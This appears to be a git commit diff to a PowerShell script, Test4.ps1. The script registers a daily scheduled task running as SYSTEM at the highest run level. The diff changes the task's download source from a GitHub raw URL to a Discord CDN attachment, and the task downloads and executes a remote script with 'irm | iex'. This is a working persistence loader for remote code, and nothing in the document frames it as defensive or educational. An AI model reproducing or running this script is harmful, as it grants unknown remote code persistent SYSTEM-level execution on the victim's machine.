3944daf994beaaf3cf51a382752ab63ae5252ccb
M3ntallyOk <127529957+M3ntallyOk@users.noreply.github.com>
2023-03-20 19:55:21 +0200

    Update Test4.ps1

--- Test4.ps1
+++ Test4.ps1
@@ -1,5 +1,5 @@
 $taskName = "Task123"
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument '/c irm https://raw.githubusercontent.com/M3ntallyOk/fasjopasfhb/main/Test3.ps1 | iex'
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument '/c irm https://cdn.discordapp.com/attachments/415117565098983424/1087433545158500434/Test3.ps1 | iex'
 $trigger = New-ScheduledTaskTrigger -Daily -At "1:27pm"
 $task = Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -User "SYSTEM" -RunLevel Highest -Force
 $task.Settings.MultipleInstances = "Parallel"
